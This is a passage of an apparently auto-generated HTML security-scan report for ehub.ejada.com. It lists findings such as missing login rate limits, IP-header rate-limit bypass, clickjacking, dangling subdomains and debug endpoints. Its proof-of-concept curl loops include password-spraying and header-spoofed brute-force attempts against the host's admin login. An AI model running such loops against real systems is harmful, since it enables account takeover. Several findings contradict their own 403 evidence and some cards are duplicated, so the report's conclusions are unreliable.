+    <div class="meta">CWE: CWE-307 &nbsp;|&nbsp; CVSS: 7.5 &nbsp;|&nbsp; Auth / Credential Stuffing</div>
+    <p>Auth endpoint /auth/token has no apparent rate limiting or lockout. Credential stuffing surface: 10 common passwords × all leaked credential pairs can be tested rapidly.</p>
+    <b>Evidence:</b><pre><code>HTTP 403 | Rate-limited: False | Lockout: False</code></pre>
+    <b>PoC (curl):</b><pre><code># Password spray (authorized testing only):
+for pass in Password1! Welcome1! Summer2024!; do
+  curl -sk -X POST &#x27;https://ehub.ejada.com/auth/token&#x27;   -H &#x27;Content-Type: application/json&#x27;   -d &#x27;{&quot;email&quot;:&quot;admin@ejada.com&quot;,&quot;password&quot;:&quot;$pass&quot;}&#x27; |   grep -v &#x27;invalid\|error&#x27;; done</code></pre>
+    <div class="fix">Fix: Implement rate limiting (5 attempts / 15 min per IP and per account). Add CAPTCHA after 3 failures. Enable account lockout. Implement breached credential detection (HaveIBeenPwned API). Use CAPTCHA on all auth flows.</div>
+  </div>
+</div>
+<div class="card" data-sev="HIGH">
+  <div class="card-hdr" style="border-left:4px solid #fd7e14">
+    <span class="badge" style="background:#fd7e14">HIGH</span>
+    <b>CREDSTUFF-API_SESSIONS</b> — Credential Stuffing Surface — No Rate Limit at /api/sessions
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-307 &nbsp;|&nbsp; CVSS: 7.5 &nbsp;|&nbsp; Auth / Credential Stuffing</div>
+    <p>Auth endpoint /api/sessions has no apparent rate limiting or lockout. Credential stuffing surface: 10 common passwords × all leaked credential pairs can be tested rapidly.</p>
+    <b>Evidence:</b><pre><code>HTTP 403 | Rate-limited: False | Lockout: False</code></pre>
+    <b>PoC (curl):</b><pre><code># Password spray (authorized testing only):
+for pass in Password1! Welcome1! Summer2024!; do
+  curl -sk -X POST &#x27;https://ehub.ejada.com/api/sessions&#x27;   -H &#x27;Content-Type: application/json&#x27;   -d &#x27;{&quot;email&quot;:&quot;admin@ejada.com&quot;,&quot;password&quot;:&quot;$pass&quot;}&#x27; |   grep -v &#x27;invalid\|error&#x27;; done</code></pre>
+    <div class="fix">Fix: Implement rate limiting (5 attempts / 15 min per IP and per account). Add CAPTCHA after 3 failures. Enable account lockout. Implement breached credential detection (HaveIBeenPwned API). Use CAPTCHA on all auth flows.</div>
+  </div>
+</div>
+<div class="card" data-sev="HIGH">
+  <div class="card-hdr" style="border-left:4px solid #fd7e14">
+    <span class="badge" style="background:#fd7e14">HIGH</span>
+    <b>CREDSTUFF-LOGIN</b> — Credential Stuffing Surface — No Rate Limit at /login
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-307 &nbsp;|&nbsp; CVSS: 7.5 &nbsp;|&nbsp; Auth / Credential Stuffing</div>
+    <p>Auth endpoint /login has no apparent rate limiting or lockout. Credential stuffing surface: 10 common passwords × all leaked credential pairs can be tested rapidly.</p>
+    <b>Evidence:</b><pre><code>HTTP 403 | Rate-limited: False | Lockout: False</code></pre>
+    <b>PoC (curl):</b><pre><code># Password spray (authorized testing only):
+for pass in Password1! Welcome1! Summer2024!; do
+  curl -sk -X POST &#x27;https://ehub.ejada.com/login&#x27;   -H &#x27;Content-Type: application/json&#x27;   -d &#x27;{&quot;email&quot;:&quot;admin@ejada.com&quot;,&quot;password&quot;:&quot;$pass&quot;}&#x27; |   grep -v &#x27;invalid\|error&#x27;; done</code></pre>
+    <div class="fix">Fix: Implement rate limiting (5 attempts / 15 min per IP and per account). Add CAPTCHA after 3 failures. Enable account lockout. Implement breached credential detection (HaveIBeenPwned API). Use CAPTCHA on all auth flows.</div>
+  </div>
+</div>
+<div class="card" data-sev="HIGH">
+  <div class="card-hdr" style="border-left:4px solid #fd7e14">
+    <span class="badge" style="background:#fd7e14">HIGH</span>
+    <b>CREDSTUFF-API_LOGIN</b> — Credential Stuffing Surface — No Rate Limit at /api/login
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-307 &nbsp;|&nbsp; CVSS: 7.5 &nbsp;|&nbsp; Auth / Credential Stuffing</div>
+    <p>Auth endpoint /api/login has no apparent rate limiting or lockout. Credential stuffing surface: 10 common passwords × all leaked credential pairs can be tested rapidly.</p>
+    <b>Evidence:</b><pre><code>HTTP 403 | Rate-limited: False | Lockout: False</code></pre>
+    <b>PoC (curl):</b><pre><code># Password spray (authorized testing only):
+for pass in Password1! Welcome1! Summer2024!; do
+  curl -sk -X POST &#x27;https://ehub.ejada.com/api/login&#x27;   -H &#x27;Content-Type: application/json&#x27;   -d &#x27;{&quot;email&quot;:&quot;admin@ejada.com&quot;,&quot;password&quot;:&quot;$pass&quot;}&#x27; |   grep -v &#x27;invalid\|error&#x27;; done</code></pre>
+    <div class="fix">Fix: Implement rate limiting (5 attempts / 15 min per IP and per account). Add CAPTCHA after 3 failures. Enable account lockout. Implement breached credential detection (HaveIBeenPwned API). Use CAPTCHA on all auth flows.</div>
+  </div>
+</div>
+<div class="card" data-sev="HIGH">
+  <div class="card-hdr" style="border-left:4px solid #fd7e14">
+    <span class="badge" style="background:#fd7e14">HIGH</span>
+    <b>CREDSTUFF-API_AUTH</b> — Credential Stuffing Surface — No Rate Limit at /api/auth
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-307 &nbsp;|&nbsp; CVSS: 7.5 &nbsp;|&nbsp; Auth / Credential Stuffing</div>
+    <p>Auth endpoint /api/auth has no apparent rate limiting or lockout. Credential stuffing surface: 10 common passwords × all leaked credential pairs can be tested rapidly.</p>
+    <b>Evidence:</b><pre><code>HTTP 403 | Rate-limited: False | Lockout: False</code></pre>
+    <b>PoC (curl):</b><pre><code># Password spray (authorized testing only):
+for pass in Password1! Welcome1! Summer2024!; do
+  curl -sk -X POST &#x27;https://ehub.ejada.com/api/auth&#x27;   -H &#x27;Content-Type: application/json&#x27;   -d &#x27;{&quot;email&quot;:&quot;admin@ejada.com&quot;,&quot;password&quot;:&quot;$pass&quot;}&#x27; |   grep -v &#x27;invalid\|error&#x27;; done</code></pre>
+    <div class="fix">Fix: Implement rate limiting (5 attempts / 15 min per IP and per account). Add CAPTCHA after 3 failures. Enable account lockout. Implement breached credential detection (HaveIBeenPwned API). Use CAPTCHA on all auth flows.</div>
+  </div>
+</div>
+<div class="card" data-sev="HIGH">
+  <div class="card-hdr" style="border-left:4px solid #fd7e14">
+    <span class="badge" style="background:#fd7e14">HIGH</span>
+    <b>CREDSTUFF-API_V1_LOGIN</b> — Credential Stuffing Surface — No Rate Limit at /api/v1/login
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-307 &nbsp;|&nbsp; CVSS: 7.5 &nbsp;|&nbsp; Auth / Credential Stuffing</div>
+    <p>Auth endpoint /api/v1/login has no apparent rate limiting or lockout. Credential stuffing surface: 10 common passwords × all leaked credential pairs can be tested rapidly.</p>
+    <b>Evidence:</b><pre><code>HTTP 403 | Rate-limited: False | Lockout: False</code></pre>
+    <b>PoC (curl):</b><pre><code># Password spray (authorized testing only):
+for pass in Password1! Welcome1! Summer2024!; do
+  curl -sk -X POST &#x27;https://ehub.ejada.com/api/v1/login&#x27;   -H &#x27;Content-Type: application/json&#x27;   -d &#x27;{&quot;email&quot;:&quot;admin@ejada.com&quot;,&quot;password&quot;:&quot;$pass&quot;}&#x27; |   grep -v &#x27;invalid\|error&#x27;; done</code></pre>
+    <div class="fix">Fix: Implement rate limiting (5 attempts / 15 min per IP and per account). Add CAPTCHA after 3 failures. Enable account lockout. Implement breached credential detection (HaveIBeenPwned API). Use CAPTCHA on all auth flows.</div>
+  </div>
+</div>
+<div class="card" data-sev="HIGH">
+  <div class="card-hdr" style="border-left:4px solid #fd7e14">
+    <span class="badge" style="background:#fd7e14">HIGH</span>
+    <b>CREDSTUFF-API_V2_AUTH</b> — Credential Stuffing Surface — No Rate Limit at /api/v2/auth
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-307 &nbsp;|&nbsp; CVSS: 7.5 &nbsp;|&nbsp; Auth / Credential Stuffing</div>
+    <p>Auth endpoint /api/v2/auth has no apparent rate limiting or lockout. Credential stuffing surface: 10 common passwords × all leaked credential pairs can be tested rapidly.</p>
+    <b>Evidence:</b><pre><code>HTTP 403 | Rate-limited: False | Lockout: False</code></pre>
+    <b>PoC (curl):</b><pre><code># Password spray (authorized testing only):
+for pass in Password1! Welcome1! Summer2024!; do
+  curl -sk -X POST &#x27;https://ehub.ejada.com/api/v2/auth&#x27;   -H &#x27;Content-Type: application/json&#x27;   -d &#x27;{&quot;email&quot;:&quot;admin@ejada.com&quot;,&quot;password&quot;:&quot;$pass&quot;}&#x27; |   grep -v &#x27;invalid\|error&#x27;; done</code></pre>
+    <div class="fix">Fix: Implement rate limiting (5 attempts / 15 min per IP and per account). Add CAPTCHA after 3 failures. Enable account lockout. Implement breached credential detection (HaveIBeenPwned API). Use CAPTCHA on all auth flows.</div>
+  </div>
+</div>
+<div class="card" data-sev="HIGH">
+  <div class="card-hdr" style="border-left:4px solid #fd7e14">
+    <span class="badge" style="background:#fd7e14">HIGH</span>
+    <b>CREDSTUFF-API_SIGNIN</b> — Credential Stuffing Surface — No Rate Limit at /api/signin
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-307 &nbsp;|&nbsp; CVSS: 7.5 &nbsp;|&nbsp; Auth / Credential Stuffing</div>
+    <p>Auth endpoint /api/signin has no apparent rate limiting or lockout. Credential stuffing surface: 10 common passwords × all leaked credential pairs can be tested rapidly.</p>
+    <b>Evidence:</b><pre><code>HTTP 403 | Rate-limited: False | Lockout: False</code></pre>
+    <b>PoC (curl):</b><pre><code># Password spray (authorized testing only):
+for pass in Password1! Welcome1! Summer2024!; do
+  curl -sk -X POST &#x27;https://ehub.ejada.com/api/signin&#x27;   -H &#x27;Content-Type: application/json&#x27;   -d &#x27;{&quot;email&quot;:&quot;admin@ejada.com&quot;,&quot;password&quot;:&quot;$pass&quot;}&#x27; |   grep -v &#x27;invalid\|error&#x27;; done</code></pre>
+    <div class="fix">Fix: Implement rate limiting (5 attempts / 15 min per IP and per account). Add CAPTCHA after 3 failures. Enable account lockout. Implement breached credential detection (HaveIBeenPwned API). Use CAPTCHA on all auth flows.</div>
+  </div>
+</div>
+<div class="card" data-sev="HIGH">
+  <div class="card-hdr" style="border-left:4px solid #fd7e14">
+    <span class="badge" style="background:#fd7e14">HIGH</span>
+    <b>CREDSTUFF-AUTH_TOKEN</b> — Credential Stuffing Surface — No Rate Limit at /auth/token
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-307 &nbsp;|&nbsp; CVSS: 7.5 &nbsp;|&nbsp; Auth / Credential Stuffing</div>
+    <p>Auth endpoint /auth/token has no apparent rate limiting or lockout. Credential stuffing surface: 10 common passwords × all leaked credential pairs can be tested rapidly.</p>
+    <b>Evidence:</b><pre><code>HTTP 403 | Rate-limited: False | Lockout: False</code></pre>
+    <b>PoC (curl):</b><pre><code># Password spray (authorized testing only):
+for pass in Password1! Welcome1! Summer2024!; do
+  curl -sk -X POST &#x27;https://ehub.ejada.com/auth/token&#x27;   -H &#x27;Content-Type: application/json&#x27;   -d &#x27;{&quot;email&quot;:&quot;admin@ejada.com&quot;,&quot;password&quot;:&quot;$pass&quot;}&#x27; |   grep -v &#x27;invalid\|error&#x27;; done</code></pre>
+    <div class="fix">Fix: Implement rate limiting (5 attempts / 15 min per IP and per account). Add CAPTCHA after 3 failures. Enable account lockout. Implement breached credential detection (HaveIBeenPwned API). Use CAPTCHA on all auth flows.</div>
+  </div>
+</div>
+<div class="card" data-sev="HIGH">
+  <div class="card-hdr" style="border-left:4px solid #fd7e14">
+    <span class="badge" style="background:#fd7e14">HIGH</span>
+    <b>CREDSTUFF-API_SESSIONS</b> — Credential Stuffing Surface — No Rate Limit at /api/sessions
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-307 &nbsp;|&nbsp; CVSS: 7.5 &nbsp;|&nbsp; Auth / Credential Stuffing</div>
+    <p>Auth endpoint /api/sessions has no apparent rate limiting or lockout. Credential stuffing surface: 10 common passwords × all leaked credential pairs can be tested rapidly.</p>
+    <b>Evidence:</b><pre><code>HTTP 403 | Rate-limited: False | Lockout: False</code></pre>
+    <b>PoC (curl):</b><pre><code># Password spray (authorized testing only):
+for pass in Password1! Welcome1! Summer2024!; do
+  curl -sk -X POST &#x27;https://ehub.ejada.com/api/sessions&#x27;   -H &#x27;Content-Type: application/json&#x27;   -d &#x27;{&quot;email&quot;:&quot;admin@ejada.com&quot;,&quot;password&quot;:&quot;$pass&quot;}&#x27; |   grep -v &#x27;invalid\|error&#x27;; done</code></pre>
+    <div class="fix">Fix: Implement rate limiting (5 attempts / 15 min per IP and per account). Add CAPTCHA after 3 failures. Enable account lockout. Implement breached credential detection (HaveIBeenPwned API). Use CAPTCHA on all auth flows.</div>
+  </div>
+</div>
+<div class="card" data-sev="HIGH">
+  <div class="card-hdr" style="border-left:4px solid #fd7e14">
+    <span class="badge" style="background:#fd7e14">HIGH</span>
+    <b>RATELIMIT-BYPASS-IPHDR-API_LOGIN</b> — Rate Limit Bypass via IP Header Rotation at /api/login
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-307 &nbsp;|&nbsp; CVSS: 7.5 &nbsp;|&nbsp; Rate Limiting</div>
+    <p>Sent 9 requests with rotating IP spoof headers to /api/login. No HTTP 429 received (codes: {403}). Rate limiting appears to be based on IP address from spoofable headers — enables unlimited brute-force attacks.</p>
+    <b>Evidence:</b><pre><code>Response codes: [403, 403, 403, 403, 403, 403, 403, 403, 403]</code></pre>
+    <b>PoC (curl):</b><pre><code>for i in $(seq 1 50); do
+  curl -sk -X POST &#x27;https://ehub.ejada.com/api/login&#x27; -H &#x27;X-Forwarded-For: 1.2.3.$i&#x27; -d &#x27;{&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;password$i&quot;}&#x27; &amp;
+done</code></pre>
+    <div class="fix">Fix: Rate-limit by session/account, not IP. Validate X-Forwarded-For against trusted proxy list. Implement CAPTCHA after N failures. Use account lockout with exponential backoff.</div>
+  </div>
+</div>
+<div class="card" data-sev="HIGH">
+  <div class="card-hdr" style="border-left:4px solid #fd7e14">
+    <span class="badge" style="background:#fd7e14">HIGH</span>
+    <b>RATELIMIT-BYPASS-IPHDR-API_AUTH</b> — Rate Limit Bypass via IP Header Rotation at /api/auth
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-307 &nbsp;|&nbsp; CVSS: 7.5 &nbsp;|&nbsp; Rate Limiting</div>
+    <p>Sent 9 requests with rotating IP spoof headers to /api/auth. No HTTP 429 received (codes: {403}). Rate limiting appears to be based on IP address from spoofable headers — enables unlimited brute-force attacks.</p>
+    <b>Evidence:</b><pre><code>Response codes: [403, 403, 403, 403, 403, 403, 403, 403, 403]</code></pre>
+    <b>PoC (curl):</b><pre><code>for i in $(seq 1 50); do
+  curl -sk -X POST &#x27;https://ehub.ejada.com/api/auth&#x27; -H &#x27;X-Forwarded-For: 1.2.3.$i&#x27; -d &#x27;{&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;password$i&quot;}&#x27; &amp;
+done</code></pre>
+    <div class="fix">Fix: Rate-limit by session/account, not IP. Validate X-Forwarded-For against trusted proxy list. Implement CAPTCHA after N failures. Use account lockout with exponential backoff.</div>
+  </div>
+</div>
+<div class="card" data-sev="HIGH">
+  <div class="card-hdr" style="border-left:4px solid #fd7e14">
+    <span class="badge" style="background:#fd7e14">HIGH</span>
+    <b>RATELIMIT-BYPASS-IPHDR-LOGIN</b> — Rate Limit Bypass via IP Header Rotation at /login
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-307 &nbsp;|&nbsp; CVSS: 7.5 &nbsp;|&nbsp; Rate Limiting</div>
+    <p>Sent 9 requests with rotating IP spoof headers to /login. No HTTP 429 received (codes: {403}). Rate limiting appears to be based on IP address from spoofable headers — enables unlimited brute-force attacks.</p>
+    <b>Evidence:</b><pre><code>Response codes: [403, 403, 403, 403, 403, 403, 403, 403, 403]</code></pre>
+    <b>PoC (curl):</b><pre><code>for i in $(seq 1 50); do
+  curl -sk -X POST &#x27;https://ehub.ejada.com/login&#x27; -H &#x27;X-Forwarded-For: 1.2.3.$i&#x27; -d &#x27;{&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;password$i&quot;}&#x27; &amp;
+done</code></pre>
+    <div class="fix">Fix: Rate-limit by session/account, not IP. Validate X-Forwarded-For against trusted proxy list. Implement CAPTCHA after N failures. Use account lockout with exponential backoff.</div>
+  </div>
+</div>
+<div class="card" data-sev="HIGH">
+  <div class="card-hdr" style="border-left:4px solid #fd7e14">
+    <span class="badge" style="background:#fd7e14">HIGH</span>
+    <b>RATELIMIT-BYPASS-IPHDR-AUTH</b> — Rate Limit Bypass via IP Header Rotation at /auth
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-307 &nbsp;|&nbsp; CVSS: 7.5 &nbsp;|&nbsp; Rate Limiting</div>
+    <p>Sent 9 requests with rotating IP spoof headers to /auth. No HTTP 429 received (codes: {403}). Rate limiting appears to be based on IP address from spoofable headers — enables unlimited brute-force attacks.</p>
+    <b>Evidence:</b><pre><code>Response codes: [403, 403, 403, 403, 403, 403, 403, 403, 403]</code></pre>
+    <b>PoC (curl):</b><pre><code>for i in $(seq 1 50); do
+  curl -sk -X POST &#x27;https://ehub.ejada.com/auth&#x27; -H &#x27;X-Forwarded-For: 1.2.3.$i&#x27; -d &#x27;{&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;password$i&quot;}&#x27; &amp;
+done</code></pre>
+    <div class="fix">Fix: Rate-limit by session/account, not IP. Validate X-Forwarded-For against trusted proxy list. Implement CAPTCHA after N failures. Use account lockout with exponential backoff.</div>
+  </div>
+</div>
+<div class="card" data-sev="MEDIUM">
+  <div class="card-hdr" style="border-left:4px solid #ffc107">
+    <span class="badge" style="background:#ffc107">MEDIUM</span>
+    <b>F-CJ-001</b> — Clickjacking Vulnerability
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-1021 &nbsp;|&nbsp; CVSS: 5.4 &nbsp;|&nbsp; Clickjacking</div>
+    <p>Page can be embedded in an iframe — clickjacking possible.</p>
+    <b>Evidence:</b><pre><code>X-Frame-Options: &#x27;&#x27; | CSP frame-ancestors: False</code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sI &#x27;https://ehub.ejada.com/&#x27; | grep -i &#x27;x-frame\|frame-ancestors&#x27;</code></pre>
+    <div class="fix">Fix: Set X-Frame-Options: DENY or CSP frame-ancestors &#x27;self&#x27;.</div>
+  </div>
+</div>
+<div class="card" data-sev="MEDIUM">
+  <div class="card-hdr" style="border-left:4px solid #ffc107">
+    <span class="badge" style="background:#ffc107">MEDIUM</span>
+    <b>DANGLE-DNS-BLOG</b> — Dangling DNS — blog.ejada.com does not resolve
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-350 &nbsp;|&nbsp; CVSS: 5.4 &nbsp;|&nbsp; Subdomain Takeover</div>
+    <p>Subdomain blog.ejada.com has no DNS record. If a CNAME chain points to an unclaimed service, takeover may be possible.</p>
+    <b>Evidence:</b><pre><code></code></pre>
+    <b>PoC (curl):</b><pre><code>dig blog.ejada.com +short</code></pre>
+    <div class="fix">Fix: Remove stale DNS records. Audit all CNAME targets for unclaimed services.</div>
+  </div>
+</div>
+<div class="card" data-sev="MEDIUM">
+  <div class="card-hdr" style="border-left:4px solid #ffc107">
+    <span class="badge" style="background:#ffc107">MEDIUM</span>
+    <b>DANGLE-DNS-HELP</b> — Dangling DNS — help.ejada.com does not resolve
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-350 &nbsp;|&nbsp; CVSS: 5.4 &nbsp;|&nbsp; Subdomain Takeover</div>
+    <p>Subdomain help.ejada.com has no DNS record. If a CNAME chain points to an unclaimed service, takeover may be possible.</p>
+    <b>Evidence:</b><pre><code></code></pre>
+    <b>PoC (curl):</b><pre><code>dig help.ejada.com +short</code></pre>
+    <div class="fix">Fix: Remove stale DNS records. Audit all CNAME targets for unclaimed services.</div>
+  </div>
+</div>
+<div class="card" data-sev="MEDIUM">
+  <div class="card-hdr" style="border-left:4px solid #ffc107">
+    <span class="badge" style="background:#ffc107">MEDIUM</span>
+    <b>DANGLE-DNS-SUPPORT</b> — Dangling DNS — support.ejada.com does not resolve
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-350 &nbsp;|&nbsp; CVSS: 5.4 &nbsp;|&nbsp; Subdomain Takeover</div>
+    <p>Subdomain support.ejada.com has no DNS record. If a CNAME chain points to an unclaimed service, takeover may be possible.</p>
+    <b>Evidence:</b><pre><code></code></pre>
+    <b>PoC (curl):</b><pre><code>dig support.ejada.com +short</code></pre>
+    <div class="fix">Fix: Remove stale DNS records. Audit all CNAME targets for unclaimed services.</div>
+  </div>
+</div>
+<div class="card" data-sev="MEDIUM">
+  <div class="card-hdr" style="border-left:4px solid #ffc107">
+    <span class="badge" style="background:#ffc107">MEDIUM</span>
+    <b>DANGLE-DNS-DEV</b> — Dangling DNS — dev.ejada.com does not resolve
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-350 &nbsp;|&nbsp; CVSS: 5.4 &nbsp;|&nbsp; Subdomain Takeover</div>
+    <p>Subdomain dev.ejada.com has no DNS record. If a CNAME chain points to an unclaimed service, takeover may be possible.</p>
+    <b>Evidence:</b><pre><code></code></pre>
+    <b>PoC (curl):</b><pre><code>dig dev.ejada.com +short</code></pre>
+    <div class="fix">Fix: Remove stale DNS records. Audit all CNAME targets for unclaimed services.</div>
+  </div>
+</div>
+<div class="card" data-sev="MEDIUM">
+  <div class="card-hdr" style="border-left:4px solid #ffc107">
+    <span class="badge" style="background:#ffc107">MEDIUM</span>
+    <b>DANGLE-DNS-STAGING</b> — Dangling DNS — staging.ejada.com does not resolve
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-350 &nbsp;|&nbsp; CVSS: 5.4 &nbsp;|&nbsp; Subdomain Takeover</div>
+    <p>Subdomain staging.ejada.com has no DNS record. If a CNAME chain points to an unclaimed service, takeover may be possible.</p>
+    <b>Evidence:</b><pre><code></code></pre>
+    <b>PoC (curl):</b><pre><code>dig staging.ejada.com +short</code></pre>
+    <div class="fix">Fix: Remove stale DNS records. Audit all CNAME targets for unclaimed services.</div>
+  </div>
+</div>
+<div class="card" data-sev="MEDIUM">
+  <div class="card-hdr" style="border-left:4px solid #ffc107">
+    <span class="badge" style="background:#ffc107">MEDIUM</span>
+    <b>DANGLE-DNS-API</b> — Dangling DNS — api.ejada.com does not resolve
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-350 &nbsp;|&nbsp; CVSS: 5.4 &nbsp;|&nbsp; Subdomain Takeover</div>
+    <p>Subdomain api.ejada.com has no DNS record. If a CNAME chain points to an unclaimed service, takeover may be possible.</p>
+    <b>Evidence:</b><pre><code></code></pre>
+    <b>PoC (curl):</b><pre><code>dig api.ejada.com +short</code></pre>
+    <div class="fix">Fix: Remove stale DNS records. Audit all CNAME targets for unclaimed services.</div>
+  </div>
+</div>
+<div class="card" data-sev="MEDIUM">
+  <div class="card-hdr" style="border-left:4px solid #ffc107">
+    <span class="badge" style="background:#ffc107">MEDIUM</span>
+    <b>DANGLE-DNS-BETA</b> — Dangling DNS — beta.ejada.com does not resolve
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-350 &nbsp;|&nbsp; CVSS: 5.4 &nbsp;|&nbsp; Subdomain Takeover</div>
+    <p>Subdomain beta.ejada.com has no DNS record. If a CNAME chain points to an unclaimed service, takeover may be possible.</p>
+    <b>Evidence:</b><pre><code></code></pre>
+    <b>PoC (curl):</b><pre><code>dig beta.ejada.com +short</code></pre>
+    <div class="fix">Fix: Remove stale DNS records. Audit all CNAME targets for unclaimed services.</div>
+  </div>
+</div>
+<div class="card" data-sev="MEDIUM">
+  <div class="card-hdr" style="border-left:4px solid #ffc107">
+    <span class="badge" style="background:#ffc107">MEDIUM</span>
+    <b>HTTP2-RAPID-RESET</b> — HTTP/2 enabled — assess CVE-2023-44487 (Rapid Reset) exposure
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-400 &nbsp;|&nbsp; CVSS: 7.5 &nbsp;|&nbsp; DoS</div>
+    <p>Server supports HTTP/2. Verify it is patched against CVE-2023-44487 (HTTP/2 Rapid Reset DoS). Vulnerable servers can be overwhelmed by RST_STREAM flood.</p>
+    <b>Evidence:</b><pre><code></code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sk --http2 -I https://ehub.ejada.com/</code></pre>
+    <div class="fix">Fix: Update HTTP server to a patched version. Apply h2 connection rate limits. Consider h2c → h1 downgrade for untrusted clients.</div>
+  </div>
+</div>
+<div class="card" data-sev="MEDIUM">
+  <div class="card-hdr" style="border-left:4px solid #ffc107">
+    <span class="badge" style="background:#ffc107">MEDIUM</span>
+    <b>DEBUG-EP-_DEBUG_PPROF</b> — Debug/profiler endpoint accessible: /debug/pprof
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-489 &nbsp;|&nbsp; CVSS: 4.3 &nbsp;|&nbsp; Information Disclosure</div>
+    <p>https://ehub.ejada.com/debug/pprof returned 403. Content: Host not in allowlist</p>
+    <b>Evidence:</b><pre><code></code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sk https://ehub.ejada.com/debug/pprof</code></pre>
+    <div class="fix">Fix: Disable debug endpoints in production. Restrict with network ACL or remove entirely.</div>
+  </div>
+</div>
+<div class="card" data-sev="MEDIUM">
+  <div class="card-hdr" style="border-left:4px solid #ffc107">
+    <span class="badge" style="background:#ffc107">MEDIUM</span>
+    <b>DEBUG-EP-_DEBUG_VARS</b> — Debug/profiler endpoint accessible: /debug/vars
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-489 &nbsp;|&nbsp; CVSS: 4.3 &nbsp;|&nbsp; Information Disclosure</div>
+    <p>https://ehub.ejada.com/debug/vars returned 403. Content: Host not in allowlist</p>
+    <b>Evidence:</b><pre><code></code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sk https://ehub.ejada.com/debug/vars</code></pre>
+    <div class="fix">Fix: Disable debug endpoints in production. Restrict with network ACL or remove entirely.</div>
+  </div>
+</div>
+<div class="card" data-sev="MEDIUM">
+  <div class="card-hdr" style="border-left:4px solid #ffc107">
+    <span class="badge" style="background:#ffc107">MEDIUM</span>
+    <b>DEBUG-EP-_DEBUG_REQUESTS</b> — Debug/profiler endpoint accessible: /debug/requests
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-489 &nbsp;|&nbsp; CVSS: 4.3 &nbsp;|&nbsp; Information Disclosure</div>
+    <p>https://ehub.ejada.com/debug/requests returned 403. Content: Host not in allowlist</p>
+    <b>Evidence:</b><pre><code></code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sk https://ehub.ejada.com/debug/requests</code></pre>
+    <div class="fix">Fix: Disable debug endpoints in production. Restrict with network ACL or remove entirely.</div>
+  </div>
+</div>
+<div class="card" data-sev="MEDIUM">
+  <div class="card-hdr" style="border-left:4px solid #ffc107">
+    <span class="badge" style="background:#ffc107">MEDIUM</span>
+    <b>DEBUG-EP-___DEBUG___</b> — Debug/profiler endpoint accessible: /__debug__/
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-489 &nbsp;|&nbsp; CVSS: 4.3 &nbsp;|&nbsp; Information Disclosure</div>
+    <p>https://ehub.ejada.com/__debug__/ returned 403. Content: Host not in allowlist</p>
+    <b>Evidence:</b><pre><code></code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sk https://ehub.ejada.com/__debug__/</code></pre>
+    <div class="fix">Fix: Disable debug endpoints in production. Restrict with network ACL or remove entirely.</div>
+  </div>
+</div>
+<div class="card" data-sev="MEDIUM">
+  <div class="card-hdr" style="border-left:4px solid #ffc107">
+    <span class="badge" style="background:#ffc107">MEDIUM</span>
+    <b>DEBUG-EP-__DEBUG_</b> — Debug/profiler endpoint accessible: /_debug/
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-489 &nbsp;|&nbsp; CVSS: 4.3 &nbsp;|&nbsp; Information Disclosure</div>
+    <p>https://ehub.ejada.com/_debug/ returned 403. Content: Host not in allowlist</p>
+    <b>Evidence:</b><pre><code></code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sk https://ehub.ejada.com/_debug/</code></pre>
+    <div class="fix">Fix: Disable debug endpoints in production. Restrict with network ACL or remove entirely.</div>
+  </div>
+</div>
+<div class="card" data-sev="MEDIUM">
+  <div class="card-hdr" style="border-left:4px solid #ffc107">
+    <span class="badge" style="background:#ffc107">MEDIUM</span>
+    <b>DEBUG-EP-__PROFILE</b> — Debug/profiler endpoint accessible: /_profile
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-489 &nbsp;|&nbsp; CVSS: 4.3 &nbsp;|&nbsp; Information Disclosure</div>
+    <p>https://ehub.ejada.com/_profile returned 403. Content: Host not in allowlist</p>
+    <b>Evidence:</b><pre><code></code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sk https://ehub.ejada.com/_profile</code></pre>
+    <div class="fix">Fix: Disable debug endpoints in production. Restrict with network ACL or remove entirely.</div>
+  </div>
+</div>
+<div class="card" data-sev="MEDIUM">
+  <div class="card-hdr" style="border-left:4px solid #ffc107">
+    <span class="badge" style="background:#ffc107">MEDIUM</span>
+    <b>DEBUG-EP-_METRICS</b> — Debug/profiler endpoint accessible: /metrics
+  </div>
+  <div class="card-body">
